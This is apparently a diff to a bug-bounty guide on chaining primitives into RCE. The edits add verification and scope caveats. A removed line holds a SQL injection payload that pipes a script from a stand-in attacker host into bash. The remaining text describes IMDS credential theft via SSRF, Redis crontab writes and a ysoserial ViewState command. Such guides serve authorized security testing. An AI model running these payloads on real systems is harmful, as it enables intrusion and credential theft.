@@ -4,16 +4,16 @@
 
 ## Gate 0 Validation
 
-Before writing the report, confirm all three:
+Historical case summaries and cross-references below are not independently verified disclosures. Before writing the report, confirm all three within approved scope:
 
 **1. What can the attacker DO right now?**
-You must be able to demonstrate one of: execute `id`/`whoami` and capture the output, make a DNS/HTTP callback from the target server to your controlled host, write a file to the filesystem, or read `/etc/passwd`. "Might be able to" fails this gate.
+You must be able to demonstrate one of: execute `id`/`whoami` and capture the output, demonstrate an execution-specific canary. A callback may prove SSRF/XXE, and file read/write alone does not prove RCE. "Might be able to" fails this gate.
 
 **2. What does the victim LOSE?**
-Articulate the concrete impact: source code exfiltration, credential theft (database, API keys, cloud IAM), lateral movement to internal network, supply chain compromise of downstream users, data destruction. Generic "attacker gains RCE" fails — name the crown jewels at risk.
+Describe demonstrated impact and separately label potential impact; do not extract real secrets or data to maximize severity. Potential impacts include: source code exfiltration, credential theft (database, API keys, cloud IAM), lateral movement to internal network, supply chain compromise of downstream users, data destruction. Generic "attacker gains RCE" fails — name the crown jewels at risk.
 
 **3. Can it be reproduced in 10 minutes from scratch?**
-Write the reproduction steps before submitting. If you need more than: (a) a Burp request, (b) a payload file, and (c) a listener — simplify it. If reproduction requires a specific race condition, timing, or ephemeral state, document the exact conditions. Triagers who can't reproduce in one attempt will downgrade or close the report.
+Write the reproduction steps before submitting. If you need more than: (a) a Burp request, (b) a payload file, and (c) a listener — simplify it. If reproduction requires a specific race condition, timing, or ephemeral state, document the exact conditions. Include prerequisites, negative controls and reproducibility limits; one failed attempt is not a universal severity rule.
 
 ---
 
@@ -34,21 +34,21 @@ During reconnaissance on a target's cloud infrastructure, a researcher discovere
 
 ## Chains & Compositions (Senior Hunting)
 
-RCE in 2020-2026 rarely arrives at a single sink. Every modern RCE is composed of (1) a primitive that puts attacker bytes onto the host or into a deserialization pipeline, plus (2) an exec gadget that interprets them. The chains below decompose six high-paying RCE shapes into their primitive components — each step is testable in isolation, the chain is what pays.
+RCE in 2020-2026 rarely arrives at a single sink. Some RCE chains combine (1) a primitive that puts attacker bytes onto the host or into a deserialization pipeline, plus (2) an exec gadget that interprets them. The chains below decompose six high-paying RCE shapes into their primitive components — each step is testable in isolation, the chain is what pays.
 
-### Chain 1 — SSRF + IMDSv1 + Leaked IAM Role → Lambda Invoke → Backend RCE (Capital One pattern)
+### Chain 1 — SSRF + IMDSv1 + Leaked IAM Role → Role Permissions (conditional chain)
 
 - **A.** SSRF on a server-side fetcher (link-preview, image proxy, webhook URL, PDF generator). Confirmed via Burp Collaborator OOB callback.
 - **B.** Point SSRF at AWS IMDSv1 metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` → returns temporary STS credentials.
-- **C.** Use the credentials with `aws lambda invoke --function-name <internal-function>` — Lambda runs server-side code that the attacker can influence via the function's input parameter.
-- **Impact:** Full backend RCE in the Lambda context, plus pivot path to whatever else the role grants (S3 / DynamoDB / RDS).
+- **C.** Use the credentials with `aws lambda invoke --function-name <internal-function>` — Invoking an existing function does not itself permit arbitrary code; a separate unsafe execution sink is required.
+- **Impact:** Only demonstrated role-permitted actions; Lambda RCE requires additional evidence, with possible access to (S3 / DynamoDB / RDS).
 - **Real shape:** Capital One 2019 — $80M civil penalty, attacker conviction. SSRF in a WAF on EC2 → IMDSv1 → IAM role → 106M-record breach via S3 sync. Cross-refs `hunt-ssrf` Disclosed Report Citation #6.
 
 ### Chain 2 — SQLi + `COPY FROM PROGRAM` → Direct OS-level RCE on Postgres Host
 
 - **A.** SQLi confirmed on a Postgres backend (boolean/time-based works; UNION not needed).
-- **B.** The DB user has either `pg_read_server_files` or `COPY` privileges (default for many AWS RDS / Google Cloud SQL roles when "admin" databases exist).
-- **C.** Stack a query: `'; COPY users FROM PROGRAM 'curl http://attacker/x.sh | bash'; --` → Postgres shells out to `/bin/sh -c <attacker command>` → RCE as `postgres` user. <!-- security-allowlist: curl-pipe-bash -->
+- **B.** Server-side COPY PROGRAM requires superuser or `pg_execute_server_program`; `pg_read_server_files` or ordinary COPY permission does not grant program execution. Managed services may restrict it.
+- **C.** Stack a query: `COPY approved_test_table FROM PROGRAM 'printf approved-canary'` (lab-only; uses a prepared disposable table) → Postgres shells out to `/bin/sh -c <attacker command>` → RCE as `postgres` user. <!-- security-allowlist: curl-pipe-bash -->
 - **Impact:** RCE as the database user, which on managed Postgres frequently has IAM credentials and direct access to other AWS resources.
 - **Real shape:** Multiple H1 disclosures 2020-2024 across SaaS apps backed by Postgres. Cross-refs `hunt-sqli` Disclosed Report Citation #12 and root cause discussion of `FILE`/`xp_cmdshell` privileges.
 
@@ -86,7 +86,7 @@ RCE in 2020-2026 rarely arrives at a single sink. Every modern RCE is composed o
 
 ### Operator-level pattern
 
-Every modern RCE chain has two halves: **the bytes get there** (SSRF, SQLi, upload, prototype-pollution, ViewState, XXE) and **the bytes get interpreted** (lambda invoke, COPY PROGRAM, webshell handler, child_process.spawn, deserializer gadget, expect://). Hunt for the first half; the second is usually one of the six above. If your first-half primitive doesn't compose with any of these — pause before submitting. "Could lead to RCE" is Low/Medium; "RCE demonstrated end-to-end" is Critical.
+Every modern RCE chain has two halves: **the bytes get there** (SSRF, SQLi, upload, prototype-pollution, ViewState, XXE) and **the bytes get interpreted** (lambda invoke, COPY PROGRAM, webshell handler, child_process.spawn, deserializer gadget, expect://). Hunt for the first half; the second is usually one of the six above. If your first-half primitive doesn't compose with any of these — pause before submitting. Severity follows demonstrated impact, authorization boundary, prerequisites and program policy; neither potential nor confirmed RCE has a universal rating.
 
 Cross-references:
 - `hunt-ssrf` — Chain 1
@@ -106,5 +106,5 @@ Cross-references:
 - **`hunt-ssrf`** — When the RCE primitive lives on an internal-only endpoint (admin console, internal Redis, Jenkins script-console), gate it through an SSRF. Chain primitive: external SSRF → `http://127.0.0.1:8080/manage/scriptText` (Jenkins/Tomcat) → Groovy `Runtime.exec` → RCE; or SSRF → `gopher://redis:6379` write to crontab → RCE.
 - **`hunt-aspnet`** — ASP.NET ViewState deserialization is a giant RCE class behind a known `__VIEWSTATE` parameter. Chain primitive: machineKey recovery (or leaked `<machineKey>` from `web.config` disclosure) → `ysoserial.net -p ViewState -g TypeConfuseDelegate` → RCE as `IIS APPPOOL\<name>`.
 - **`security-arsenal`** — Reach for the deserialization payload tree (ysoserial Java gadget chains, ysoserial.net for .NET ViewState/BinaryFormatter, Python pickle `__reduce__`, Ruby Marshal, PHP `phar://` metadata, Node `node-serialize` IIFE) the moment you have a sink that accepts serialized bytes.
-- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical. A "blind RCE" that turns out to be file-write-only with no execution path is not RCE; a sandboxed eval that can't reach `os` is at best Medium SSTI. Prove `whoami`/OOB DNS callback with a unique marker before writing the report.
+- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical. A "blind RCE" that turns out to be file-write-only with no execution path is not RCE; a sandboxed eval requires impact assessment rather than an automatic severity ceiling. Prove `whoami`/OOB DNS callback with a unique marker before writing the report.
 
